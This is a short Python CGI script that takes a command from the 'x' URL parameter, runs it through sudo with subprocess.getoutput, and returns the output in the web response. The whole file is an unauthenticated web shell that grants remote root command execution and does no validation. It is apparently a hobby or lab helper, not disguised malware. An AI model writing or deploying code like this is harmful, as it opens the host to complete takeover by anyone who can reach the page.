#!/usr/bin/python3

print("content-type:text/html")
print()



import cgi
import subprocess


ret = cgi.FieldStorage()
cmd = ret.getvalue("x")

output = subprocess.getoutput("sudo"+"    "+cmd)
print(output)
